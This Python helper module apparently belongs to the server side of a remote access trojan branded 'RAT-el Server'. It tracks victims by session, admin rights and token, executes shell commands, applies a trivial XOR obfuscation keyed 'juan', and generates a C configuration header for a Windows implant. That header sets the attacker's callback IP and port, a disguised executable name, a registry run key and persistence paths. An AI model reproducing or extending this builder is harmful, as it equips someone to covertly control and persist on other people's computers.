from colorama import Fore,Style
from subprocess import Popen
from subprocess import PIPE
import socket

#CONSTANT:
NB_SESSION = 0
NB_SOCKET = 1
NB_IP = 2
NB_PORT = 3
NB_ALIVE = 4
NB_ADMIN = 5
NB_PATH = 6
NB_USERNAME = 7
NB_TOKEN = 8
NB_SELECT = 9  #When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False). This serves to avoid confusion when sending data. 

SOCK_TIMEOUT = 4

SPLIT = "|SPLIT|"
#session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
def XOREncryption(data):
    key =["j","u","a","n"] 
    result = ""
    print("LEN DATA: ",len(data))
    for x in range(len(data)):
       
        current = data[x]
        #print("CURRENT: ",current)
        #print("CMPT:",x)
        current_key  = key[x % len(key)]
        #print("CURRENT KEY:", current_key)
        
        result+= chr(ord(current) ^ ord(current_key))
        print("char crypt: ",current,"result char xor: ",result[x],"cmpt: ",x)
    
    #print("payload-->", result)
    return result

def exec(command):
    with Popen(str(command), stdout=PIPE,stderr=PIPE,shell=True) as cmd:
        out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
        if not err:
            print(out)
            return out
        else:
            print(err)
            return err



def printColor(status,message):
    ERROR_COLOR = "\033[31m" #red
    HELP_COLOR = "\033[35m" #magenra
    TERMINAL_COLOR = "\033[34m" #blue
    INFO_COLOR =  "\033[33m"
    ARRAY_COLOR = "\033[36m" #cayen
    SUCCESSFULLY_COLOR = "\033[32m"

    RESET_COLOR = Style.RESET_ALL

    if status == "error":
        print(ERROR_COLOR+message+TERMINAL_COLOR)
    elif status == "information":
        print(INFO_COLOR+message+TERMINAL_COLOR)
    elif status == "help":
        print(HELP_COLOR+message+TERMINAL_COLOR)
    elif status == "successfully":
        print(SUCCESSFULLY_COLOR+message+TERMINAL_COLOR)

def myBanner():
    myvar = """
                         .:--=======-:.                         
                    .-+#%@@@@@@@@@@@@@@%#+=:                    
                 :+#@%#*+=-::::::-=+*#%@@@@@%*-                 
              .=#%*=:                  :=*%@@@@%+:              
            .+%+:   .:-=+++****++==-:      :+%@@@@#-            
          .+#-  .:=*************+==--:.       -#@@@@#:          
         -*:  :+***********+=:.:---:.           :#@@@@+         
        +-  -********=-:::.-++=:.                 -%@@@#.       
      .=. -********- .-==*+-           .:=+**#%%%%%%@@@@%:      
     .- .+********: +@@#-           .=#@@@@@@@@@@@@@@@@@@%:     
     : :*********= =@%-           . :+#@@@@@@@@@@@@@@@@@@@%:    
      -*********+.-%+          :*#*#@@@@@@@@@@@@@@@@@@@@@@@%.   
     -*********+ =%-          +#=:: -@@@@@@@@@@@@@@@@@@@@@@@+   
    .*********+ =%:          #%#@@@* %@@@@@@@%*+=-=++*##%@@@@.  
    +*********.-%:          =@@@@@@@-@@@@@%+:.=*#%@@@@@@@@@@@+  
   -*********=.%=      .-=+*%@@@@@@%%@@@@*.     .=#@@@@@@@@@@%  
   +*********.*#     .*@@@@@@@@@@@@@@@@@#+###-:=*##%@@@@@@@@@@. 
  .*********:-@:     +%@%#@@@@@@@@@@@@@@@@%-:*@@@@@@@@@@@@@@@@- 
  :********= %%    .+@@+  %@@@@@@@@@@@@@@+.+@@@@@@@@@@@@@@@@@@- 
  -*******+ +@%==+#@@%-  :@@@@@@@@@@@@@@= *@@@@@@@@@@@@@@@@@@@- 
  -******+ =@@@@@@@@%-.-*@@@@@@@@@@@@@@+ =@@@@@@@@@@@@@@@@@@@@: 
  :*****+.-@@@@@@@@@%@@@@@@@@@@@@@@@@@%..+@@@@@@@@@@@@@@@@@@@%  
  .****- =%**%@@@@@@@@@@@@@@@@@@@@@@@@+ .#@@@@@@@@@@@@@@@@@@@*  
   ++: :#%#*+=#@@@@@@@@@@@@@@@@@@@@@@%..#@@@@@@@@@@@@@@@@@@@@-  
   . :#+=====%@@@@@@@@@@@%*=:+@@@@@@%-=%@@@@@#*++*#@@@@@@@@@#   
     %:=@@%%@@@@@@@@@@@%- :-.=@@@@@@#%@@@@@@#+: .. .*@@@@@@@:   
     *+:+:=%@@@@@@@@@@*.-*#*#@@@@@@@@@@#*+-..-+****- *@@@@@=    
      =%%@@@@@@@@@@@%++##=-+%@@@@%#+-:  .:-+*******+ .%@@@+     
       .+%@@@@@@@@@%#%+:-+%@@@%*-  .:=+***********+.  #@@+      
          -+#%@@@@@@%++#@@@@#= .:=***************+.  :%@=       
         ::.  .-=-.+%@@%#*=. -+*****************-   =%%:              
          :**+++++-.      :=******************=.  .*%+             
            :+*******+=++*******************=.   =%*.               ____  ___  ______         __   _____    
              :=*************************+-.  .=%+.                / __ \/   |/_  __/   ___  / /  / ___/___  ______   _____  _____
                 :-+******************=-.   :+*-                  / /_/ / /| | / /_____/ _ \/ /   \__ \/ _ \/ ___/ | / / _ \/ ___/   
                     .:-==++++++==-:.   .-==-                    / _, _/ ___ |/ /_____/  __/ /   ___/ /  __/ /   | |/ /  __/ / 
                                    ...::                       /_/ |_/_/  |_/_/      \___/_/   /____/\___/_/    |___/\___/_/
"""
    return myvar


def commonHeader():
    header = """
#ifndef COMMON_H
#define COMMON_H
//default header
#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "192.168.0.98" //Ip of server
#define PORT 8888 //Port of server
#define AUTO_PERSISTENCE false
#define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
#define TOKEN "|GENERATE_TOKEN|" //the token
#define NAME_PROG "12.exe" //Name of prog
#define NAME_KEY_REGISTER  "win64" 

#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH

//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
// DO NOT TOUCH:

#define TIMEOUT_CREATE_PROC  10000
#define BUFFER_LEN 4096
#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
#define SLEEP_RECV 200 // DO NOT TOUCH 
#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
#define MICRO_SLEEP 100 //micro sleep for timeout
#define SPLIT "|SPLIT|" 


#endif

/*
$USER is changed by the user who executed the program.
*/
"""
    return header

def customHeader(ip, auto, port, reco, name, token, registry): 
    #In order not to have an error you need 4 \.
    #Example C:\ = C:\\\\
    header = """
#ifndef COMMON_H
#define COMMON_H

#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "{}" //Ip of server
#define PORT {} //Port of server
#define AUTO_PERSISTENCE {}
#define TIMEOUT {} // Seconds for reconnect to server during a disconnection
#define NAME_PROG "{}" //Name of prog
#define TOKEN "{}"
#define NAME_KEY_REGISTER  "{}" 

#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH

//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
// DO NOT TOUCH:

#define TIMEOUT_CREATE_PROC  10000
#define BUFFER_LEN 4096
#define TIMEOUT_SOCK 5 // DO NOT TOUCH 
#define SLEEP_RECV 200 // DO NOT TOUCH 
#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
#define MICRO_SLEEP 100 //micro sleep for timeout
#define SPLIT "|SPLIT|" 



#endif

""".format(ip, port, auto, reco, name,token, registry)

    return header

